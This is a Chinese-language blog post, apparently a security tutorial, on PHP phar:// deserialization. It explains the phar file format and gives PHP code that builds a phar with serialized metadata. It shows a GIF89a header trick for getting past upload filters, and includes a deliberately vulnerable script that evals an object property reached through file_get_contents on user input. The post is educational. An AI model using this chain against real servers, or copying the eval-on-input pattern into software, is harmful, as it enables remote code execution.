@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.5.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.5.0" type="image/png" sizes="32x32"><meta name="google-site-verification" content="QDXQenTtxQ6MwW-M_7k9lw39Kq7F4pwFO0u1QAPYlDE"><meta name="description" content="Phar文件介绍                           什么是 phar 文件       phar 是 PHP 文件的一种打包格式，可以将 PHP 代码文件和其他资源文件（JS、CSS等）打包成一个文件进行分发。可以简单理解为类似于 rar 压缩包。参考资料">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phar:&#x2F;&#x2F;反序列化总结">
+<meta property="og:url" content="http://www.7ten7.top/2019/05/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="7TEN7&#39;s Blog">
+<meta property="og:description" content="Phar文件介绍                           什么是 phar 文件       phar 是 PHP 文件的一种打包格式，可以将 PHP 代码文件和其他资源文件（JS、CSS等）打包成一个文件进行分发。可以简单理解为类似于 rar 压缩包。参考资料">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdoehz7qj30g506j74h.jpg">
+<meta property="og:image" content="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdp4eewaj30sj09ydgz.jpg">
+<meta property="og:image" content="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdphkquqj30z90cfgnj.jpg">
+<meta property="article:published_time" content="2019-05-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-05-11T06:56:07.107Z">
+<meta property="article:author" content="7TEN7">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="序列化漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdoehz7qj30g506j74h.jpg"><title>Phar://反序列化总结 | 7TEN7's Blog</title><link ref="canonical" href="http://www.7ten7.top/2019/05/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"><link rel="alternate" href="/atom.xml" type="application/atom+xml"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.5.0"><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" data-ad-client="ca-pub-4793862971469188" async=""></script><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"simple","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: true,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Phar://反序列化总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2019-05-11</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.2k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">7分</span></span></div></header><div class="post-body">
+        <h1 id="Phar文件介绍"   >
+          <a href="#Phar文件介绍" class="heading-link"><i class="fas fa-link"></i></a>Phar文件介绍</h1>
+      
+        <h2 id="什么是-phar-文件"   >
+          <a href="#什么是-phar-文件" class="heading-link"><i class="fas fa-link"></i></a>什么是 phar 文件</h2>
+      <p>phar 是 PHP 文件的一种打包格式，可以将 PHP 代码文件和其他资源文件（JS、CSS等）打包成一个文件进行分发。可以简单理解为类似于 rar 压缩包。<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/u011474028/article/details/54973571"  target="_blank" rel="noopener">参考资料</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <a id="more"></a></p>
+
+        <h2 id="phar文件格式"   >
+          <a href="#phar文件格式" class="heading-link"><i class="fas fa-link"></i></a>phar文件格式</h2>
+      <p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdoehz7qj30g506j74h.jpg"  alt="phar文件格式">
+      </p>
+
+        <h3 id="1-a-stub"   >
+          <a href="#1-a-stub" class="heading-link"><i class="fas fa-link"></i></a>1.a stub</h3>
+      <p>存根。是一个php文件，<strong>&lt;?php __HALT_COMPILER(); </strong> 是一个最小的存根。</p>
+<p>其中存根前面可以为任何内容，但必须以<strong>__HALT_COMPILER();</strong> 结尾，同时<strong>__HALT_COMPILER();</strong>也是PHP来识别一个文件是否为phar文件的关键，而无需在意文件的后缀名是否为 <strong>.phar</strong> ,所以我们可以在phar文件首加入<strong>GIF89a</strong> ，同时将文件后缀名更改为<strong>.gif</strong>来将文件伪装成为一个图片文件来绕过上传。</p>
+
+        <h3 id="2-a-manifest-describing-the-contents"   >
+          <a href="#2-a-manifest-describing-the-contents" class="heading-link"><i class="fas fa-link"></i></a>2.a manifest describing the contents</h3>
+      <p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdp4eewaj30sj09ydgz.jpg"  alt="a manifest describing the contents">
+      </p>
+<p>清单。因为phar文件是压缩文件，这其中便存储这文件的权限和属性等信息。同时还用户自定义的Meta-data数据序列化后存储到其中。正因如此，这里就是攻击点之一。</p>
+
+        <h3 id="3-the-file-contents"   >
+          <a href="#3-the-file-contents" class="heading-link"><i class="fas fa-link"></i></a>3.the file contents</h3>
+      <p>文件内容。归档中包含的原始文件。</p>
+
+        <h3 id="4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"   >
+          <a href="#4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="heading-link"><i class="fas fa-link"></i></a>4.[optional] a signature for verifying Phar integrity (phar file format only)</h3>
+      <p>[可选]验证Phar完整性的签名(只适用于Phar文件格式)</p>
+
+        <h2 id="利用PHP生成一个phar文件"   >
+          <a href="#利用PHP生成一个phar文件" class="heading-link"><i class="fas fa-link"></i></a>利用PHP生成一个phar文件</h2>
+      <p>下面这个demo程序展示了如何使用PHP生成一个phar文件</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span>  $file = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"hello.phar"</span>);</span><br><span class="line">$test = <span class="keyword">new</span>  a();</span><br><span class="line">$phar = <span class="keyword">new</span>  Phar(<span class="string">"hello.phar"</span>); <span class="comment">//定义phar文件的文件名</span></span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"><span class="comment">// 增加gif文件头</span></span><br><span class="line"><span class="comment">/* $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); */</span></span><br><span class="line">$phar-&gt;setMetadata($test); <span class="comment">//设置phar归档元数据</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>); <span class="comment">//以字符串的形式添加一个文件到 phar 档案</span></span><br><span class="line">$phar-&gt;stopBuffering(); <span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="PHP流的概念"   >
+          <a href="#PHP流的概念" class="heading-link"><i class="fas fa-link"></i></a>PHP流的概念</h1>
+      <blockquote>
+<p>我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。<span class="exturl"><a class="exturl__link"   href="https://laravelacademy.org/post/7459.html"  target="_blank" rel="noopener">参考资料</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+
+        <h2 id="PHP-标准输入输出"   >
+          <a href="#PHP-标准输入输出" class="heading-link"><i class="fas fa-link"></i></a>PHP 标准输入输出</h2>
+      <p>PHP是如何从命理行获取输入的内容的，其中用到的就是php输入流<code>php://stdin</code> 。下面这个demo程序展示了如何使用PHP输入输出流来进行标准输入输出</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$in = fopen(<span class="string">"php://stdin"</span>, <span class="string">"r"</span>);</span><br><span class="line">$str = fgets($in);</span><br><span class="line">$out = fopen(<span class="string">"php://stdout"</span>,<span class="string">"w"</span>);</span><br><span class="line">fwrite($out,$str);</span><br><span class="line">fclose($in);</span><br><span class="line">fclose($out);</span><br></pre></td></tr></table></div></figure>
+<p><strong>其中 phar:// 协议的作用是将压缩包内的文件进行解析</strong></p>
+
+        <h1 id="phar-反序列化漏洞利用"   >
+          <a href="#phar-反序列化漏洞利用" class="heading-link"><i class="fas fa-link"></i></a>phar:// 反序列化漏洞利用</h1>
+      <p>在 phar://反序列化漏洞之前，想要触发反序列化漏洞必须要有这两点</p>
+<ol>
+<li>unserailize()函数</li>
+<li>unserailize()函数的参数可控</li>
+</ol>
+<p>只有满足这两点，才有可能利用反序列化漏洞</p>
+<p>但 phar://反向序列化漏洞使得利用反序列化漏洞的利用条件变为</p>
+<ol>
+<li>phar文件能被上传到服务器</li>
+<li>有文件操作函数且参数可控（这里可利用的函数远不止文件操作类函数）<span class="exturl"><a class="exturl__link"   href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0"  target="_blank" rel="noopener">参考资料</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li>phar://未被过滤</li>
+</ol>
+<p>这几点就大大的拓展了反序列化漏洞的攻击面。</p>
+<p><strong>文件操作函数中的参数可控时，且 phar:// 未被过滤，在利用 phar:// 协议操作 phar 文件时，phar 文件 mete-data 数据就会自动进行反序列化。</strong></p>
+
+        <h2 id="简单演示"   >
+          <a href="#简单演示" class="heading-link"><i class="fas fa-link"></i></a>简单演示</h2>
+      <p>先使用下列程序(1.php)生成一个 hello.phar 文件</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span>  $file = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">"hello.phar"</span>);</span><br><span class="line">$test = <span class="keyword">new</span>  a();</span><br><span class="line">$phar = <span class="keyword">new</span>  Phar(<span class="string">"hello.phar"</span>); <span class="comment">//定义phar文件的文件名</span></span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"><span class="comment">// 增加gif文件头</span></span><br><span class="line"><span class="comment">/* $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); */</span></span><br><span class="line">$phar-&gt;setMetadata($test); <span class="comment">//设置phar归档元数据</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>); <span class="comment">//以字符串的形式添加一个文件到 phar 档案</span></span><br><span class="line">$phar-&gt;stopBuffering(); <span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></div></figure>
+<p>下面是受攻击的 2.php 文件内容</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'test'</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span>  $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_get_contents($test);</span><br></pre></td></tr></table></div></figure>
+<p>接下来访问 2.php 文件，得到以下结果</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2xdphkquqj30z90cfgnj.jpg"  alt="结果">
+      </p>
+<p>原理方面的东西涉及PHP的底层，由于自己太菜，看不懂底层的东西…所以就总结下这个漏洞该这么利用吧。</p>
+<p>参考链接</p>
+<p><a href="[https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/">一篇文章带你深入理解漏洞之 PHP 反序列化漏洞</a>)</p>
+<p><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/u011474028/article/details/54973571"  target="_blank" rel="noopener">php归档格式：phar文件详解（创建、使用、解包还原提取）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   href="https://laravelacademy.org/post/7459.html"  target="_blank" rel="noopener">最佳实践系列（十）：PHP 统一资源处理 API —— 流（Stream）的概述与使用详解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0"  target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   href="https://paper.seebug.org/680/"  target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://www.7ten7.top">7TEN7</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://www.7ten7.top/2019/05/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">http://www.7ten7.top/2019/05/11/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/PHP/">PHP</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">序列化漏洞</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/05/11/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E6%8E%A2%E7%A9%B6/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">PHP匿名函数探究</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/04/20/2019%20%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"><span class="paginator-prev__text">2019西湖论剑线下赛总结</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Phar文件介绍"><span class="toc-number">1.</span> <span class="toc-text">
+          Phar文件介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是-phar-文件"><span class="toc-number">1.1.</span> <span class="toc-text">
+          什么是 phar 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar文件格式"><span class="toc-number">1.2.</span> <span class="toc-text">
+          phar文件格式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-a-stub"><span class="toc-number">1.2.1.</span> <span class="toc-text">
+          1.a stub</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-a-manifest-describing-the-contents"><span class="toc-number">1.2.2.</span> <span class="toc-text">
+          2.a manifest describing the contents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-the-file-contents"><span class="toc-number">1.2.3.</span> <span class="toc-text">
+          3.the file contents</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><span class="toc-number">1.2.4.</span> <span class="toc-text">
+          4.[optional] a signature for verifying Phar integrity (phar file format only)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用PHP生成一个phar文件"><span class="toc-number">1.3.</span> <span class="toc-text">
+          利用PHP生成一个phar文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP流的概念"><span class="toc-number">2.</span> <span class="toc-text">
+          PHP流的概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-标准输入输出"><span class="toc-number">2.1.</span> <span class="toc-text">
+          PHP 标准输入输出</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar-反序列化漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">
+          phar:&#x2F;&#x2F; 反序列化漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单演示"><span class="toc-number">3.1.</span> <span class="toc-text">
+          简单演示</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author/author.png" alt="avatar"></div><p class="sidebar-ov-author__text">7TEN7</p></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-rss"><a class="sidebar-ov-feed-rss__link" href="/atom.xml" target="_blank" rel="noopener"><span class="sidebar-ov-feed-rss__icon"><i class="fas fa-rss"></i></span><span>RSS 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">55</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__devider"></span><span>7TEN7</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,255,255" opacity="1" count="200" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'Nzl7LsK4moQuOsIfeWfbc8Rz-gzGzoHsz',
+    appKey: '5xmoJuWrMWHpI7pwtJviyIh6',
+    notify: true,
+    verify: true,
+    placeholder: 'Just go go',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: false,
+    recordIP: true,
+    lang: '' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (false) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.5.0"></script><script src="/js/stun-boot.js?v=2.5.0"></script><script src="/js/scroll.js?v=2.5.0"></script><script src="/js/header.js?v=2.5.0"></script><script src="/js/sidebar.js?v=2.5.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":260,"height":380,"vOffset":5},"mobile":{"show":true},"log":false});</script></body></html>
